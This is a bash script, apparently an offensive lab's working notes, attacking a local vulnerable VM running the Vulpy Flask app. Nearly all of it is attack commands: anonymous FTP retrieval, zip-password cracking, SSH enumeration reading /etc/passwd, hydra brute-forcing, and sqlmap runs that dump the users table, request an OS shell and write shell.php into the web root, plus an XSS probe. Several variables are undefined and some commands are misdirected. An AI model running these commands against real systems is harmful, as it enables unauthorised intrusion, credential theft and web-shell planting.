#!/bin/bash

mkdir -p "${HOME}/reports"
mkdir -p "${HOME}/scans/vulnbox"
LOGFILE="$(pwd)/reports/scan-results-$(date +"%Y%m%d-%H%M%S").log"
exec > >(tee -a "$LOGFILE") 2>&1

VULNBOX_IP=192.168.56.101

mkdir -p ~/scans/vulnbox && cd ~/scans/vulnbox

nmap --script=http-vuln* -p 5000 ${VULNBOX_IP}


nmap -Pn -sV -sC -p21,22,80,5000 \
  --script banner,ftp-anon,ftp-syst,http-title,http-headers,http-enum,http-robots.txt \
  -oN nmap_focus.txt ${VULNBOX_IP}

nmap -sS -sV -p- -A --script=banner,ftp-anon,http-enum,http-title,ssh-hostkey,upnp-info,vuln ${VULNBOX_IP} -oN nmap_full.txt

# nmap -sS -sV -p- -A --script=banner,ftp-anon,http-enum,ssh-hostkey,upnp-info,vuln ${VULNBOX_IP} -oN nmap_full.txt

# attacker side
nmap -sV -p 21,22,80,5000 ${VULNBOX_IP} -oN nmap_ports.txt
# check UPnP
nmap -p 5000 --script=upnp-info ${VULNBOX_IP}
nmap -p21 --script=ftp-anon ${VULNBOX_IP}
#ftp ${VULNBOX_IP}         # try username anonymous

# ftp login to download the tom.zip
ftp -inv <<EOF
open ${VULNBOX_IP}
user anonymous your_email@example.com
get tom.zip
bye
EOF

# crack tom.zip password
zip2john tom.zip > tom_zip_hash.txt
gzip -d /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt tom_zip_hash.txt
john --show tom_zip_hash.txt
unzip -P querty -d tom tom.zip

ssh -i tom/vulnbox -vvv ubuntu@${VULNBOX_IP}    # read banner; or use nmap ssh-hostkey



ssh ubuntu@${VULNBOX_IP} << EOF
whoami; id
hostname; uname -a; cat /etc/os-release
ps aux --sort=-%mem | head
ss -tulpn
sudo -l
find / -perm /4000 -type f 2>/dev/null
find / -xdev -type f -perm -o+w 2>/dev/null
grep -Ri "password" /var/www 2>/dev/null
grep -Ri "password" /srv/flask/vulpy/bad 2>/dev/null
cat /etc/passwd
exit
EOF


# try common creds using hydra for a login form (example form params)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=wrong" ${VULNBOX_IP} -V


hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt http://${VULNBOX_IP}:5000/user http-form-post "/login:username=^USER^&password=^PASS^:Incorrect" -t 4 -f -o "$OUT/hydra_login.txt"

#hydra -l admin -P "${WORDLIST_TO_USE}" "${TARGET_HOST}" http-get-form "${DVWA_BRUTE_FORCE_PATH}:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low:F=Username and/or password incorrect." 2>&1 | tee -a "${OUTDIR}/hydra_brute_force.log"
#HYDRA_EXIT_STATUS=${PIPESTATUS[0]} # Capture hydra's exit status


# Discover hidden endpoints (directory fuzzing)
gobuster dir -u http://${VULNBOX_IP}:5000/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,py,json -t 40 -o gobuster_5000.txt
gobuster dir -u http://${VULNBOX_IP}/ -w /usr/share/wordlists/dirb/common.txt -x php,phpinfo,txt -t 40 -o gobuster_80.txt

curl -sS http://${VULNBOX_IP}/ -o phpinfo.html

# save root and posts page
curl -sS "http://$IP:5000/" -o "$OUT/root_5000.html"


curl -sS http://${VULNBOX_IP}:5000/posts -o posts.html
grep -Eo "([?&][a-zA-Z0-9_]+=)" posts.html || grep -i "form" -n posts.html
# quick searches inside saved page
grep -nEi "form|input|href|action|csrf|token|session|id=|/posts/" "$OUT/posts_5000.html" || true


nikto -host http://${VULNBOX_IP} -output nikto_80_scan.txt
nikto -host http://${VULNBOX_IP}:5000 -output nikto_5000_scan.txt
# Or run Burp/ZAP proxy manual testing for auth/session issues, CSRF, XSS, etc.


wapiti -u http://${VULNBOX_IP}:5000 -f html -o wapiti_report.txt
wapiti -u http://192.168.56.101:5000 --auth-type post -a "admin%admin" -s http://192.168.56.101:5000/login -f html -o wapiti_report -S aggressive -v 3



# check for obvious stacktrace / Werkzeug in page
curl -s "http://$VULNBOX_IP:5000/posts" | grep -i Werkzeug -n || true
# attempt to trigger error page (for stacktrace) by hitting a non-existent route with bad input
curl -s "http://$VULNBOX_IP:5000/nonexistent?_debug=1" -o "$OUT/trigger_debug.html"
grep -i "Traceback" "$OUT/trigger_debug.html" || true


http://192.168.56.101:5000/user/login
username=%27&password=admin&otp=


# vulpy_session

# recon
sqlmap -u "http://192.168.56.101:5000/user/login" \
  --data="username=admin&password=admin&otp=" \
  -p username,password \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --batch \
  --flush-session \
  --level=5 \
  --risk=3 \
  --os="Linux" \
  --random-agent \
  --web-root="/srv/flask/vulpy/bad" \
  --dbs

# tables
sqlmap -u "http://192.168.56.101:5000/user/login" \
  --data="username=admin&password=admin&otp=" -p username \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
  --os="Linux" --random-agent \
  --tables

# tables#2
sqlmap -u "http://192.168.56.101:5000/user/login" \
  --data="username=admin&password=admin&otp=" \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --prefix="admin' AND " --suffix="-- kQKZ" -p username \
  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
  -D SQLite_masterdb \
  --os="Linux" --random-agent \
  --tables

# users
sqlmap -u "http://192.168.56.101:5000/user/login" \
  --data="username=admin&password=admin&otp=" \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --prefix="admin' AND " --suffix="-- kQKZ" -p username \
  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
  -D SQLite_masterdb \
  --os="Linux" --random-agent \
  -T users --columns

sqlmap -u "http://192.168.56.101:5000/user/login" \
  --data="username=admin&password=admin&otp=" \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --prefix="admin' AND " --suffix="-- kQKZ" -p username \
  --batch --flush-session --level=5 --risk=3 --dbms=sqlite \
  -D SQLite_masterdb \
  --os="Linux" --random-agent \
  -T users --dump

# os-shell [*]
sqlmap -u "http://192.168.56.101:5000/user/login" \
  --cookie="vulpy_session=eyJ1c2VybmFtZSI6ICJhZG1pbiJ9" \
  --batch \
  --flush-session \
  --level=5 \
  --risk=3 \
  --dbs \
  --dbms=sqlite \
  --os="Linux" \
  --random-agent \
  --web-root="/srv/flask/vulpy/bad" \
  --dbs \
  --os-shell

# sqlite3 ~/Downloads/db_users.sqlite "SELECT * FROM users;"


sqlmap -u "http://${VULNBOX_IP}:5000/posts?id=1" -p id --batch --dbs --level=5 --risk=3 --output-dir=~/scans/vulpy

mysql -h ${VULNBOX_IP} -u dbuser -p'password' -e "show databases;"

sqlmap -u "http://${VULNBOX_IP}:5000/posts?id=1" --dbs --batch --level=5 --risk=3
# list tables
sqlmap -u "http://${VULNBOX_IP}:5000/posts?id=1" -D <dbname> --tables
# check for file write possibilities
sqlmap -u "http://${VULNBOX_IP}:5000/posts?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/vulpy/shell.php"


# simple manual test: reflected XSS attempt
curl -s "http://$IP:5000/posts?search=<script>alert(1)</script>" -o "$OUT/xss_test.html"
grep -n "<script>alert(1)</script>" "$OUT/xss_test.html" && echo "Reflected XSS likely" || echo "No immediate reflection"

# test common parameters: loop through parameters found earlier
# more advanced: use Burp to intercept & test payloads or use dalfox/wfuzz



grep -n "csrf" "$OUT/posts_5000.html" || echo "No csrf found in posts page"
# or list all forms
python3 - <<'PY'
from bs4 import BeautifulSoup
print(open("$OUT/posts_5000.html").read()[:5000])
soup=BeautifulSoup(open("$OUT/posts_5000.html"),"html.parser")
for f in soup.find_all("form"):
    print("FORM action:", f.get("action"))
    for i in f.find_all("input"):
        print("  input:", i.get("name"))
PY




wpscan --url http://${VULNBOX_IP}:5000 --enumerate u



wpscan --username admin --url http://${VULNBOX_IP}:5000 --wordlist /usr/share/wordlists/metasploit/http_default_pass.txt --wp-content-dir http://${VULNBOX_IP}:5000/ --threads 20


# grep "\[!\]" linpeas_sh_scan_results.log | awk -F'[][]' '{print $2 "\t" $3}' | column -t -s $'\t' 

#tar -czf "vulpy_scan_${IP}_$(date +%F_%T).tgz" ./*
#ls -lh

